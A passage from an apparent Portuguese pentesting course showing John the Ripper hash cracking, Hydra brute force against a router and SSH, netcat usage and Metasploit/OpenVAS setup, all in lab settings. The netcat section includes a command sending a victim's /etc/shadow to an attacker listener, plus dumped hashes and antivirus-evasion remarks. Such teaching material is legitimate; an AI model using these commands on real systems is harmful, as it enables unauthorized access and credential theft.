encontrados na tela. --shells=-/bin/false: Indica para o john excluir todos os resultados dos usuários que possuem a shell /bin/bash. 210<br /> <br /> pass.txt: Nome do arquivo a ser analisado pelo john. Desta forma o John irá apresentar na tela apenas usuário com shells válidas. Podemos criar um arquivo com apenas o resultado de shells válidas apresentadas. É possível também quebrar a senha apenas de um usuário específico. Para utilizar o John apenas para um usuário específico do arquivo gerado pelo unshadow, o arquivo pass.txt digite o comando com os seguintes parâmetros: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="beccd1d1cafed5dfd2d7">[email&#160;protected]</a>:~# john --format=sha512crypt --user=root pass.txt Created directory: /root/.john Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Press 'q' or Ctrl-C to abort, almost any other key for status 123456 (root) 1g 0:00:00:01 DONE 2/3 (2017-05-21 21:09) 0.7352g/s 652.2p/s 652.2c/s 652.2C/s 123456..green Use the "--show" option to display all of the cracked passwords reliably Session completed john: Executa a aplicação john the ripper. --format=sha512crypt: Indica o tipo de hash que a senha a ser quebrada está utilizando. --user=root: Indica o usuário alvo de quem será quebrada a senha. pass.txt: Nome do arquivo a ser analisado pelo john.<br /> <br /> 211<br /> <br /> Desta forma o processo de quebra de senha se tornar bem mais rápido, observe que a senha foi encontrada em poucos segundos. 3.2.<br /> <br /> John the Ripper – Dicionário<br /> <br /> Vamos realizar um teste com o John the Ripper no modo Dicionário. Iremos passar um arquivo wordlist para que ele consulte as senhas apenas neste arquivo de possíveis senhas. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5d2f3232291d363c3134">[email&#160;protected]</a>:~# john --format=sha512crypt --wordlist=/root/ WordList/wordlist.txt pass.txt Using default input encoding: UTF-8 Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Remaining 3 password hashes with 3 different salts Press 'q' or Ctrl-C to abort, almost any other key for status senha123 (madvan) user123 (user01) 2g 0:00:00:00 DONE (2017-05-21 16:05) 25.00g/s 150.0p/s 450.0c/s 450.0C/s 123456 Use the "--show" option to display all of the cracked passwords reliably Session completed john: Executa a aplicação John the Ripper. --format=sha512crypt: Indica o tipo de hash que a senha a ser quebrada está utilizando. --wordlist=/root/WordList/wordlist.txt: Indica o arquivo wordlist.txt para ser utilizado na tentativa de quebra de senhas com o método dicionário. pass.txt: Nome do arquivo a ser analisado pelo john.<br /> <br /> 212<br /> <br /> Observe que agilizamos o processo de quebra de senha em poucos segundos, porém no arquivo wordlist.txt que passamos, obrigatória deve existir a senha, já que a busca só será por tentativa e erro das senhas que lá se encontram. Fonte: Videoaula TDI – Trabalhando com Senhas – Descobrindo Senhas com o John<br /> <br /> 4.<br /> <br /> THC Hydra<br /> <br /> O THC Hydra é um cracker de senha que suporta numerosos protocolos para atacar logins na rede. Esta ferramenta oferece aos pesquisadores e consultores de segurança a possibilidade de mostrar o quão fácil seria obter acesso não autorizado a um sistema remoto. Atualmente, essa ferramenta suporta: AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, FTPS, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTP-PROXY-URLENUM, ICQ, IMAP, IRC, LDAP2, LDAP3, MS-SQL, MYSQL, NCP, NNTP, Oracle, Oracle-Listener, Oracle-SID, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, REXEC, RLOGIN, RSH, SAP/R3, SIP, SMB, SMTP, SMTP-Enum, SNMP, SOCKS5, SSH(v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMwareAuth, VNC e XMPP. Utilizando o Hydra O hydra é uma ferramenta que faz parte da suíte de programas do Kali Linux. Vamos realizar uma tentativa de quebra de senha do roteador da rede. Primeiramente verifique o IP do roteador. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="22504d4d566249434e4b">[email&#160;protected]</a>:~# route -n<br /> <br /> 213<br /> <br /> Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 0.0.0.0 172.16.0.1 0.0.0.0 UG 100 0 0 eth0 172.16.0.0 0.0.0.0 255.255.255.0 U 100 0 0 eth0 Agora que sabemos o IP do roteador vamos realizar o ataque brute-force passando uma wordlist com possíveis senhas para routers, digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="bfcdd0d0cbffd4ded3d6">[email&#160;protected]</a>:~# hydra -l admin -P /root/passwords-routers.lst 172.16.0.1 http-get Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (http://www.thc.org/thc-hydra) starting at 2017-05-21 21:49:42 [WARNING] You must supply the web page as an additional option or via -m, default path set to / [DATA] max 7 tasks per 1 server, overall 64 tasks, 7 login tries (l:1/p:7), ~0 tries per task [DATA] attacking service http-get on port 80 [80][http-get] host: 172.16.0.1 login: admin password: admin 1 of 1 target successfully completed, 1 valid password found Hydra (http://www.thc.org/thc-hydra) ﬁnished at 2017-05-21 21:49:47 hydra: Executa a aplicação hydra. -l admin: -l Indica o nome do usuário da credencial a ser realizado o ataque, neste caso o usuário admin. -P /root/passwords-routers.lst : -P Indica um arquivo wordlist de senhas que será utilizado no ataque, neste caso o arquivo passwordsrouters.lst. 172.16.0.1: IP do alvo a ser atacado. 214<br /> <br /> http-get: Tipo de protocolo que o roteador utiliza para realizar login, neste caso o login é realizado através do navegador web. Observe que em poucos segundos o hydra quebrou a senha do roteador com a wordlist que passamos. Podemos utilizar o hydra para encontrar senhas de serviços específicos, por exemplo o serviço ssh, em um servidor. Para isso vamos iniciar uma máquina Metasploitable para realizar o teste. Primeiramente vamos realizar um scan com o nmap no IP do servidor do nosso alvo para verificar se o serviço está ativo e qual porta ele está utilizando, abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="fd8f929289bd969c9194">[email&#160;protected]</a>:~# nmap -sV 172.16.0.12 Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-21 22:45 BST Nmap scan report for 172.16.0.12 Host is up (0.00010s latency). Not shown: 977 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 23/tcp open telnet Linux telnetd 25/tcp open smtp Postﬁx smtpd 53/tcp open domain ISC BIND 9.4.2 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) DAV/2) … MAC Address: 08:00:27:F2:EB:AE (Oracle VirtualBox virtual NIC) 215<br /> <br /> Service Info: Hosts: metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/ o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds Observe que o serviço ssh está ativo e rodando na porta padrão 22. Vamos realizar a tentativa de login com o hydra com 2 arquivos, um de possíveis usuários (user.lst) e o outro de possíveis senhas (passwords.lst). Digite no terminal: hydra -L /root/users.lst -P /root/passwords.lst -t 4 172.16.0.12 ssh Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (http://www.thc.org/thc-hydra) starting at 2017-05-21 22:56:57 [DATA] max 4 tasks per 1 server, overall 64 tasks, 64 login tries (l:8/p:8), ~0 tries per task [DATA] attacking service ssh on port 22 [22][ssh] host: 172.16.0.12 login: msfadmin password: msfadmin [22][ssh] host: 172.16.0.12 login: user-ftp password: user123 1 of 1 target successfully completed, 2 valid passwords found Hydra (http://www.thc.org/thc-hydra) ﬁnished at 2017-05-21 22:57:25 hydra: Executa a aplicação hydra. -L /root/users.lst: -L Indica um arquivo wordlist de usuários que será utilizado no ataque, neste caso o arquivo users.lst. 216<br /> <br /> -P /root/passwords.ls: -P Indica um arquivo wordlist de senhas que será utilizado no ataque, neste caso o arquivo passwords.lst. -t 4: Indica o número de tentativas a cada solicitação de login, por padrão ele realiza 16 tentativas, no caso iremos realizar 4. 172.16.0.12: IP do alvo a ser atacado. ssh: Tipo de protocolo a ser atacado, neste caso ssh. Observe que o hydra encontrou 2 senhas e os usuários com acesso a ssh neste servidor.<br /> <br /> Observações: (01) É possível encontrar muitos arquivos de senhas padrão de roteadores na internet, basta realizar uma busca das palavras “wordlist router password” no google.com e você irá encontrar diversos links para download de listas. (02) O processo de quebra de senhas exige paciência do lado atacante, poder de processamento e memória da máquina que está sendo utilizada para realizar o ataque, existem senhas que podem levar horas/dias/ meses/anos para serem quebradas. (03) Existem diversas formas de se proteger de ataques de quebras de senha, algumas delas é restringir o número de tentativas de login em uma conta, usar mais de um método de autenticação em um sistema (token e senha), implementar sistemas de autenticação a nível de hardware ao invés de senhas, encorajar os usuários a utilizarem programas que geram senhas automaticamente. 217<br /> <br /> Fonte: Videoaula TDI – Trabalhando com Senhas – Descobrindo Senhas com o Hydra<br /> <br /> 218<br /> <br /> Chapter 09<br /> <br /> 219<br /> <br /> 2. CANIVETE SUÍÇO (NETCAT)<br /> <br /> UNIDADE 09<br /> <br /> O netcat é conhecida como canivete suíço do TCP/ IP, esta ferramenta permite o usuário atuar como cliente ou servidor, com esta ferramenta é possível entender conceitos como conexão direta, conexão reversa e DNS Dinâmico. Iremos entender como funciona uma backdoor. Esta ferramenta é muito utilizada durante um processo de invasão para manter o acesso, ela funciona como uma ponte e iremos entender o porquê disso. 1.<br /> <br /> Uso Básico do NETCAT<br /> <br /> O netcat faz parte da suíte de ferramentas do Kali Linux. Veja alguns conceitos de uso do netcat: Conectando a um serviço (cliente): <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="aad8c5c5deeac1cbc6c3">[email&#160;protected]</a>:~# nc oi.com.br 80 _ Após a conexão estabelecida é possível aplicar alguns comandos, como por exemplo GET /: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="86f4e9e9f2c6ede7eaef">[email&#160;protected]</a>:~# nc oi.com.br 80 GET / Oi | Combo, TV, Celular, Internet, Fixo, Recarga Fonte: Videoaula TDI – Canivete Suíço – Reverse Shell<br /> <br /> 225<br /> <br /> 3.<br /> <br /> Transferir dados com o netcat<br /> <br /> Para Transferir dados entre hosts com o netcat, execute o comando no host Kali Linux do atacante para receber os dados: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5c2e3333281c373d3035">[email&#160;protected]</a>:~# nc -vnlp 1500 > shadow-vitima.txt Através da shell que de alguma forma foi disponibilizada pela vítima execute o comando: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="25574a4a51654d4a5651">[email&#160;protected]</a>_alvo:~# nc 192.168.0.25 1500 < /etc/shadow Aguarde a transferência dos dados (não é mostrado de forma verboso) e finalize a conexão (Ctrl+C) e verifique o arquivo shadow-vitima.txt. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="6d1f0202192d060c0104">[email&#160;protected]</a>:~# cat shadow-vitima.txt root:$1$/avpfRJ1$x4z8w5UF9Iv./DR9E9Lid.: 14747:0:99999:7::: daemon:*:14684:0:99999:7::: bin:*:14684:0:99999:7::: sys: $1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:: : sync:*:14684:0:99999:7::: games:*:14684:0:99999:7::: man:*:14684:0:99999:7::: lp:*:14684:0:99999:7::: mail:*:14684:0:99999:7::: news:*:14684:0:99999:7:::<br /> <br /> 226<br /> <br /> Observações: (01) Existe diversas formas para este comando ser executado para ser imperceptível para a vítima, rodando em background. (02) A melhor vantagem para um atacante utilizando o Reverse Shell é a de que ele tem total controle sobre o servidor, podendo manter o acesso independentemente do local que o cliente estiver acessando. (03) O netcat não está instalado por padrão no Windows, porém é possível realizar a instalação. Criminosos usam diversas maneiras, como engenharia social e exploração de vulnerabilidades para realizar um upload do netcat para a máquina Windows. Estes comandos podem até estar contido em alguns programas disponibilizados na web, principalmente em programas “craqueados” que necessitam desativar o firewall/antivírus.<br /> <br /> 227<br /> <br /> Chapter 10<br /> <br /> 228<br /> <br /> UNIDADE 10 2. METASPLOIT Através do uso de ferramentas de varredura de informação, como nmap, Nessus, HTTP Grabbing, temos informações de versões de servidores e aplicativos, por exemplo, um servidor web, de alguma forma descobrimos a sua versão com o nome do serviço e a versão podemos utilizar um exploit específico para saber como invadir este servidor web, praticamente uma receita de bolo para uma invasão específica. Um exploit é um pedaço de software, um pedaço de dados ou uma sequência de comandos que tomam vantagem de um defeito, falha ou vulnerabilidade a fim de causar um comportamento acidental ou imprevisto a ocorrer no software ou hardware de um computador ou em algum eletrônico (normalmente computadorizado). Este comportamento frequentemente inclui ganhar o controle de um sistema de computador, permitindo elevação de privilégio ou um ataque de negação de serviço. Fonte: Videoaula TDI – Metasploit – Introdução<br /> <br /> 1. 1.1.<br /> <br /> Conceitos CVE - Common Vulnerabilities and Exposures<br /> <br /> O CVE é uma base de dados internacional para documentar as vulnerabilidades públicas. Ele funciona da seguinte maneira: quando uma vulnerabilidade é encontrada ela é inserida na base dados do CVE. 229<br /> <br /> Neste processo de documentação existe uma padronização que deve ser seguida da seguinte maneira:<br /> <br /> (01) Descrição da vulnerabilidade: É necessário descrever a vulnerabilidade informando em que aplicação/serviço/sistema a falha foi encontrada, em que parte do código, entre outros, com todos os detalhes. (02) Método de exploração: É necessário descrever os métodos passo a passo da exploração da vulnerabilidade. (03) Correção da vulnerabilidade: Se possível é necessário descrever como a vulnerabilidade pode ser corrigida. Com estas informações o CVE irá encontrar um identificador único, veja um exemplo: CVE-2016-1909 CVE - ano_de_publicação - número_da_vulnerabilidade Com esse identificador único esta falha estará disponível de forma organizada e publicada pelo CVE.<br /> <br /> Site oficial CVE https://cve.mitre.org Uma exploit é uma forma de explorar falha em algo, podendo ser desde pequenas peças a pedaços de códigos. Estes exploits são indexados em base de 230<br /> <br /> dados de diversos fornecedores no mundo. São os mais famosos:<br /> <br /> Offensive Security’s Exploit Database https://www.exploit-db.com/<br /> <br /> Além de encontrar exploits, este site oferece Shellcodes, que são códigos auxiliares para escrever alguns tipos de exploits, e os Papers, que são conteúdos de estudo sobre os exploits.<br /> <br /> 0day.today Inj3ct0r Exploit Database http://www.0day.today/ Um dos bancos mais antigos na rede no Inj3ct0r Exploit Database em que podemos encontrar exploits recentes que, para ter acesso, é necessário realizar pagamentos, geralmente realizados através de Bitcoin. Porém, com o tempo, estes exploits se tornam públicos. 231<br /> <br /> Para encontrar os exploits podemos navegar nestes sites ou utilizar a barra de pesquisa para encontrar exploits específicos. Veja um exemplo de um cabeçalho de um exploit:<br /> <br /> fonte: https://www.exploit-db.com/exploits/39224/<br /> <br /> Observe que ele segue a organização clara para um leitor. Identificador da vulnerabilidade na base de dados (EDB-ID), o responsável pela documentação (Author), a data de publicação da vulnerabilidade (Published), o identificador CVE (CVE), o tipo do método a ser utilizado para o uso (Type), o tipo de plataforma do alvo (Platform), o status da verificação do exploit (E-DB Verified), o exploit (Exploit). Fonte: Videoaula TDI – Metasploit – Conceitos por Gabriel<br /> <br /> 1.2.<br /> <br /> Metasploit Framework 232<br /> <br /> Esta sessão irá ajudar você a entender o Metasploit Framework, como ele funciona e como realiza explorações de vulnerabilidades referentes a sistemas de redes. Vamos explorar os processos de técnicas de invasão com ênfase no Metasploit Framework e seu conjunto de scanners, exploits, payloads e ferramentas de pós-exploração. Sobre o Metasploit Framework O Metasploit é um projeto open source criado por HD Moore com o objetivo de fornecer um ambiente adequado para o desenvolvimento, testes de segurança e exploração de vulnerabilidades de softwares. O projeto nasceu em 2003 com o objetivo de fornecer informações úteis sobre a realização de testes de invasão e compartilhar algumas ferramentas. O primeiro release foi lançado oficialmente apenas em 2004 e contava com alguns exploits escritos por C. Perl e Assembly. Quando a versão 3.x foi lançada em 2007 o framework foi quase que totalmente reescrito em Ruby, isso facilitou bastante a criação de novos exploits e atraiu novos desenvolvedores para o projeto. Em 2009 a Rapid7 compra o Metasploit e um ano depois lança a versão comercial do projeto o Metasploit Pro.<br /> <br /> Arquitetura e Funcionalidades<br /> <br /> 233<br /> <br /> O REX (Ruby Extension Library) é o núcleo do Metasploit. Ele disponibiliza a API com funcionalidades que ajudam no desenvolvimento de um exploit, além de bibliotecas, sockets e protocolos. O framework-core é constituído de subsistemas que controlam sessões, módulos, eventos e a API base. O framework-base fornece uma API amigável e simplifica a comunicação com outros módulos, interfaces e plugins. Na camada modules é onde residem os exploits e payloads. Basicamente os exploits são programas escritos para explorar alguma falha e o payload é como um complemento para o exploit. Basicamente o payload é o código que vai ser injetado no alvo e ao ser injetado, alguma ação pré-definida será executada, 234<br /> <br /> como realizar um download, executar um arquivo, apagar alguma informação ou estabelecer uma conexão com outro sistema. A camada Interfaces conta com o modo console, onde temos um shell que trabalha em conjunto com o SO, e o CLII, que fornece uma interface onde é possível automatizar testes de invasão e ainda temos interfaces WEB e GUI. Utilizando o Metasploit Framework O Metasploit Framework é uma aplicação que faz parte da suíte de ferramentas do Kali Linux. Primeiramente para utilizá-lo é necessário iniciar o banco de dados. Abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="6614090912260d070a0f">[email&#160;protected]</a>:~# service postgresql start Após isso, é necessário iniciar a base de dados do Metasploit Framework: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c1b3aeaeb581aaa0ada8">[email&#160;protected]</a>:~# msfdb init Creating database user 'msf' Enter password for new role: Enter it again: Creating databases 'msf' and 'msf_test' Creating conﬁguration ﬁle in /usr/share/metasploit-framework/ conﬁg/database.yml Creating initial database schema Com o msfdb e o PostgreSQL iniciado, digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="8bf9e4e4ffcbe0eae7e2">[email&#160;protected]</a>:~# msfconsole 235<br /> <br /> Call trans opt: received. 2-19-98 13:24:18 REC:Loc Trace program: running wake up, Neo... the matrix has you follow the white rabbit. knock, knock, Neo. (`. ,-, ` `. ,;' / `. ,'/ .' `. X /.' .-;--''--.._` ` ( .' / ` , `' Q' , , `._ \ ,.| ' `-.;_' : . ` ; ` ` --,.._; ' ` , ) .' `._ , ' /_ ; ,''-,;' ````-..__``--` http://metasploit.com Love leveraging credentials? Check out bruteforcing in Metasploit Pro -- learn more on http://rapid7.com/metasploit =[ metasploit v4.14.1-dev ] + -- --=[ 1628 exploits - 927 auxiliary - 282 post ] + -- --=[ 472 payloads - 39 encoders - 9 nops ] + -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ] msf > 236<br /> <br /> msfconsole: Indica a console do Metasploit Framework. Algumas utilidades básicas deste Framework fornecem funcionalidades adicionais ao Metasploit, estes utilitários são: msfcli : Permite que um pentester projete e automatize a execução do exploit, porém podemos executar e definir todas as opções necessárias, como parâmetros na linha de comando. msfpayload : Cria cargas que serão enviadas ao sistema de destino, e podem fornecer acesso remoto através de uma variedade de shells reversos, comandos pipe, VNC e outros. Os payloads podem ser executados a partir de shells, utilizando códigos de ferramentas de programação como Java, Python, interpretadores Ruby, DLLs, executáveis do Windows, executáveis IOS e Android, Linux e outros. msfencode : O msfencode altera os payloads para evitar a detecção. As ferramentas de antivírus possuem assinaturas para payloads do Metasploit e podem detectá-las facilmente. Esta ferramenta altera as cargas úteis para tornar a detecção baseadas em assinaturas mais fáceis. Estes 3 utilitários apresentados eram ferramentas, chaves do Metasploit anteriormente, porém foram realizadas algumas alterações. 237<br /> <br /> A primeira alteração foi realizada ao msfcli, ele foi removido da estrutura padrão, porém há uma funcionalidade equivalente, obtida quando usamos o comando msfconsole, o parâmetro -x . Com este parâmetro podemos relacionar todos os comandos em uma única linha, sem a necessidade de entrar no console. Em relação a alterações nos utilitários msfpayload e msfencode foram substituídos pelo msfvenom, com as mesmas funções, porém em uma única ferramenta. O msfvenom fornece uma única ferramenta a carga de codificações. Apesar de não relatarmos aqui todas as funções sobre o Metasploit Framework, iremos apresentar o caminho para que você possa seguir sozinho com suas pesquisas. Fonte: Videoaula TDI – BootCamp de Metasploit – Componentes do Framework Metasploit<br /> <br /> 1.3.<br /> <br /> NMAP e OpenVAS<br /> <br /> As ferramentas NMAP e o OpenVAS são bastante utilizadas em conjunto com o Metasploitable Framework para auxiliar e agilizar o processo de exploração e trazem a um atacante informações cruciais para um ataque. O nmap é uma ferramenta que faz parte da suíte de programas do Kali Linux. Para verificar a sua utilização, digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b2c0ddddc6f2d9d3dedb">[email&#160;protected]</a>:~# man nmap O OpenVAS é uma estrutura de vários serviços e ferramentas que oferecem uma abrangente e poderosa 238<br /> <br /> solução de vulnerabilidades e gerenciamento de vulnerabilidades. O framework faz parte da solução de gerenciamento de vulnerabilidades comerciais da Greenbone Networks, das quais os desenvolvimentos são contribuídos para a comunidade Open Source desde 2009. Overview da arquitetura O OpenVAS é um quadro de vários serviços e ferramentas. O núcleo desta arquitetura SSLsecured service-oriented é o Scanner OpenVAS. O scanner executa de forma muito eficiente os Testes de Vulnerabilidade de Rede reais (NVTs) que são atendidos através do OpenVAS NVT Feed ou através de um serviço de alimentação comercial.<br /> <br /> 239<br /> <br /> Ele funciona através da shell (OpenVAS CLI) e através do browser (Greenbone Security Assistance), utiliza seus próprios serviços, pois se trata de um Framework, onde ele realiza a comunicação com os alvos realizando scanners. Acesse o site oficial do OpenVAS para mais informações: http://openvas.org/ O OpenVAS não faz parte da suíte de ferramentas do Kali Linux, para instalar e configurar siga as instruções abaixo: Verifique se sua distribuição Kali Linux é superior à versão 4.6.0, para isso digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="12607d7d665279737e7b">[email&#160;protected]</a>:~# uname -r 4.6.0-kali1-amd64 Caso a sua versão seja inferior, realize o upgrade do sistema com os comandos: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="9ae8f5f5eedaf1fbf6f3">[email&#160;protected]</a>:~# apt-get update <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d4a6bbbba094bfb5b8bd">[email&#160;protected]</a>:~# apt-get upgrade <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e4968b8b90a48f85888d">[email&#160;protected]</a>:~# apt-get dist-upgrade Vamos agora iniciar a instalação do OpenVAS. Digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c6b4a9a9b286ada7aaaf">[email&#160;protected]</a>:~# apt-get install openvas Reading package lists... Done Building dependency tree Reading state information... Done ... 240<br /> <br /> Após a conclusão da instalação, é necessário executar o setup do OpenVAS para que ele crie uma CA (Certification Authority), que irá fazer com que as configurações do OpenVAS possam ser aplicadas. Digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="abd9c4c4dfebc0cac7c2">[email&#160;protected]</a>:~# openvas-setup<br /> <br /> ... sent 719 bytes received 35,718,437 bytes 802,677.66 bytes/ sec total size is 35,707,385 speedup is 1.00 /usr/sbin/openvasmd User created with password '63f4d617-0b68-46d9-b535e5fd310bcde5'. Ele irá criar uma chave privada, baixar e instalar alguns scripts e módulos automaticamente, para que o serviço seja configurado corretamente e pronto para a utilização. Observe que, ao criar a chave privada RSA de 4096 bit, ele inicia todo o processo de segurança e criptografia e irá informar uma senha, anote-a: 63f4d617-0b68-46d9-b535-e5fd310bcde5 *use a senha que o seu openvas-setup gerou.<br /> <br /> Vamos agora iniciar o serviço OpenVAS. Digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="dcaeb3b3a89cb7bdb0b5">[email&#160;protected]</a>:~# openvas-start Starting OpenVAS Services Agora vamos verificar se as portas necessárias estão abertas. Digite no terminal: 241<br /> <br /> <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2755484853674c464b4e">[email&#160;protected]</a>:~# netstat -antp<br /> <br /> Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1385/sshd tcp 0 0 127.0.0.1:9390 0.0.0.0:* LISTEN 11065/openvasmd tcp 0 0 127.0.0.1:9392 0.0.0.0:* LISTEN 11087/gsad tcp 0 0 127.0.0.1:80 0.0.0.0:* LISTEN 11090/ gsad tcp 0 0 172.16.0.15:22 172.16.0.10:42448 ESTABLISHED 1422/sshd: madvan [ tcp6 0 0 :::22 :::* LISTEN 1385/sshd<br /> <br /> Observe que as portas necessárias estão abertas e no campo PID/Name Program podemos verificar o serviço do OpenVAS. Vamos agora acessar a interface gráfica via web. Entre com as credenciais de acesso, usuário: admin, senha: informada no openvas-setup, e acesse a página: https://127.0.0.1:9392<br /> <br /> 242<br /> <br /> O sistema OpenVAS está configurado e pronto para o uso. Fonte: Videoaula TDI – BootCamp de Metasploit – NMAP e OpenVAS<br /> <br /> 2.<br /> <br /> Metasploit Scanning<br /> <br /> Vamos realizar um teste de scanning em algumas máquinas, uma Linux e outra Windows para verificar o funcionamento deste serviço do metasploit. Veja alguns comandos que podemos utilizar para esse processo: Search: Busca dentro do Metasploit Framework de payloads, módulos, entre outros. Use: Indica ao msfconsole para utilizar uma payloads, módulos, entre outros. 243<br /> <br /> Set hosts: conﬁgura um IP em um exploit, payload e meterpreter. Run/exploit: Executa a ação conﬁgurada. Help: Apresenta em tela informações, comando e exemplos de uso de um exploit, payload, meterpreter, módulos, entre outros. Info: Apresenta em tela informações sobre um exploit, payload, meterpreter, módulos, entre outros. Show – options: Apresenta opções que podem ser utilizadas com o msfconsole. Abra o terminal do Kali Linux e digite os comandos no console do Metasploit Framework: msf > search scanner Matching Modules ================ Name Date Rank<br /> <br /> Description<br /> <br /> Disclosure ------- -------- ----<br /> <br /> ----------auxiliary/admin/appletv/appletv_display_image normal Apple TV Image Remote Control auxiliary/scanner/winrm/winrm_login normal WinRM Login Utility auxiliary/scanner/winrm/winrm_wql normal WinRM WQL Query Runner auxiliary/gather/enum_dns normal DNS Record Scanner and Enumerator<br /> <br /> 244<br /> <br /> post/windows/gather/arp_scanner normal Windows Gather ARP Scanner ... Ele irá procurar na base de dados os módulos que contenham a descrição como portscan. Observe que existem inúmeros módulos que podemos utilizar para escanear serviços específicos, como ssh, vmware, smtp, entre outros. Agora inicie as duas máquinas alvo, uma Linux e outra Windows. Para realizar um teste de scanner em portas TCP. Digite no msfconsole: msf > search portscan Matching Modules ================ Name Description<br /> <br /> Disclosure Date Rank -------- ------- ----<br /> <br /> -----------<br /> <br /> auxiliary/scanner/http/wordpress_pingback_access normal Wordpress Pingback Locator auxiliary/scanner/natpmp/natpmp_portscan normal NAT-PMP External Port Scanner auxiliary/scanner/portscan/ack normal TCP ACK Firewall Scanner auxiliary/scanner/portscan/ftpbounce normal FTP Bounce Port Scanner auxiliary/scanner/portscan/syn normal TCP SYN Port Scanner auxiliary/scanner/portscan/tcp normal TCP Port Scanner<br /> <br /> 245<br /> <br /> auxiliary/scanner/portscan/xmas TCP "XMas" Port Scanner auxiliary/scanner/sap/sap_router_portscanner normal SAPRouter Port Scanner<br /> <br /> normal<br /> <br /> msf > Observe que ele retornou módulos que podemos escanear pacotes ACK em relação a firewall, pacotes ftpbounce, syn,xmas, entre outros. Vamos utilizar um módulo que realize um scanner g e ra l e m p o r t a s d e s e r v i ç o T P C . D i g i t e n o msfconsole: msf > use auxiliary/scanner/portscan/tcp msf auxiliary(tcp) ><br /> <br /> Observe que ele nos trouxe no console o módulo auxiliar (tcp), podemos agora verificar as opções que podemos utilizar com este módulo. Digite no msfconsole: msf auxiliary(tcp) > show options Module options (auxiliary/scanner/portscan/tcp): Name Current Setting Required Description ----- ---------- -------- ----------CONCURRENCY 10 yes The number of concurrent ports to check per host DELAY 0 yes The delay between connections, per thread, in milliseconds JITTER 0 yes The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds. PORTS 1-10000 yes Ports to scan (e.g. 22-25,80,110-900)<br /> <br /> 246<br /> <br /> RHOSTS identiﬁer THREADS 1 TIMEOUT 1000 milliseconds<br /> <br /> yes yes yes<br /> <br /> The target address range or CIDR The number of concurrent threads The socket connect timeout in<br /> <br /> msf auxiliary(tcp) ><br /> <br /> Observe que ele apresentou na tela as opções básicas que podem ser configuradas dentro deste módulo, podemos utilizar também o comando info, que irá mostrar na tela informações detalhadas sobre o módulo. Digite no msfconsole: msf auxiliary(tcp) > info Name: TCP Port Scanner Module: auxiliary/scanner/portscan/tcp License: Metasploit Framework License (BSD) Rank: Normal Provided by: hdm kris katterjohn Basic options: Name Current Setting Required Description ------ --------- -------- ----------CONCURRENCY 10 yes The number of concurrent ports to check per host DELAY 0 yes The delay between connections, per thread, in milliseconds JITTER 0 yes The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds. PORTS 1-10000 yes Ports to scan (e.g. 22-25,80,110-900) RHOSTS yes The target address range or CIDR identiﬁer<br /> <br /> 247<br /> <br /> THREADS TIMEOUT milliseconds<br /> <br /> 1 1000<br /> <br /> yes yes<br /> <br /> The number of concurrent threads The socket connect timeout in<br /> <br /> Description: Enumerate open TCP services by performing a full TCP connect on each port. This does not need administrative privileges on the source machine, which may be useful if pivoting. msf auxiliary(tcp) ><br /> <br /> Observe que ele apresentou com detalhes as informações deste módulo, nome, licença, rank, provedor e descrição. Vamos configurar a opção RHOSTS para indicar uma máquina para realizar o scan. Neste caso, a máquina Linux (Metasploitable2) que será alvo do nosso teste. Digite no msfconsole: msf auxiliary(tcp) > set rhosts 172.16.0.12 rhosts => 172.16.0.12 A g o ra va m o s c o n f i g u ra r a s p o r t a s a s e r e m escaneadas, caso não indicarmos esta opção ele irá realizar o scanner nas portas 1-10000 , como apresentado através do comando info. Digite no msfconsole: msf 